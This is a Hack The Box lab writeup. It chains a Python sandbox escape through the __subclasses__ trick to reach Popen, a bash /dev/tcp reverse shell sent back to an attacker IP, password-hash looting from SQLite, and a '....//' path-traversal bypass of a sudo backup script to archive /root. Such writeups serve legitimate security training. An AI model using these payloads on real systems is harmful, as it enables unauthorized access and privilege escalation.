# HTB Machine Writeup — Python Exception RCE → Full Root

**Author:** Mridul Chamoli
**Difficulty:** Easy
**Technique:** Python Exception Abuse → Reverse Shell → Writable DB Looting → Backup Script Bypass → Root

---

# ⭐ Step 1: Recon — Because Hacking Without Spying is Just Guessing

Classic nmap warm-up:

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/code$ nmap -sV -sC -A <IP>
```

Nothing fancy — open ports, services, versions… the usual. The machine basically handed over clues without a fight.

---

# 🧩 Step 2: Code Execution Through Pure Python Wizardry

The web app blocked imports, blocked eval, and blocked anything fun… **except exceptions**.

Exceptions = free introspection = free recon.

So I poked it with this:

```python
print((()).__class__.__bases__[0].__subclasses__())
```

Boom — 400+ Python classes dumped on screen like a buffet.

Among them, I wanted **Popen**, the subprocess gateway to command execution.

But here's the twist: no index(), no search. Gotta guess:

```python
raise Exception((()).__class__.__bases__[0].__subclasses__()[100].__name__)
raise Exception((()).__class__.__bases__[0].__subclasses__()[200].__name__)
raise Exception((()).__class__.__bases__[0].__subclasses__()[317].__name__)
```

🎉 **317 = Popen jackpot!**

(Ok fine — I cheated with MS Word Ctrl+F. Hacker life.)

---

# 🎯 Step 3: Reverse Shell — With Nothing but Exceptions

Listener ready:

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/code$ nc -lvnp 4444
```

Payload wrapped inside an exception (because the app LOVES exceptions):

```python
raise Exception(str((()).__class__.__bases__[0].__subclasses__()[317](
    "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'", 
    shell=True, stdout=-1).communicate()))
```

Hit enter → Netcat popped → Shell acquired.

Welcome to:

```
app-production@app:~$ whoami
app-production
```

Not root yet — but we’re hungry.

---

# 🔎 Step 4: Hunting for Writable Files

Time to sniff around:

```bash
find / -writable -type f 2>/dev/null | grep -Ev '^/proc|^/sys'
```

Scrolling… scrolling… then:

**database.db** appeared.

Like an ex coming back only when you’re finally doing good in life.

Before diving deeper, easy user flag:

```bash
cd ..
cat user.txt
```

---

# 🗄️ Step 5: Looting the SQLite Database

Into the treasure room:

```bash
cd instance
sqlite3 database.db
.tables
SELECT * FROM USER;
```

Two hashes found. Ran them through CrackStation and—

🎉 **martin’s password cracked.**

SSH time:

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/machine$ ssh martin@10.10.11.62
```

We’re in as Martin.

---

# 📦 Step 6: Privilege Escalation — backy.sh (Backup Script Hijack)

Inside Martin’s home, I spot a 2.8MB binary owned by root, executable by all.

Then I found **backy.sh**, a JSON-driven backup script that only allows:

* `/home/`
* `/var/`

But thanks to a sneaky trick:

```
/home/....//root/
```

This bypasses filters.

Create payload config:

```bash
cat > root-steal.json << EOF
{
  "destination": "/home/martin/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/....//root/"
  ]
}
EOF
```

Now trigger the backup:

```bash
sudo /usr/bin/backy.sh root-steal.json
```

A tarball drops neatly into Martin’s home.

Extract it:

```bash
tar -xvf code_home_.._root_2025_June.tar.bz2
```

Inside?

📜 **root.txt**.

Mission complete.

---

# 🏁 Final Thoughts

This machine was a mix of:

* Python internals trickery 🐍
* Creative exception abuse 💥
* Database looting 📦
* Backup-script bypass 🎣

Chaotic? Yes. Fun? Absolutely.

Until the next shell pop… 🫡🐚🔥
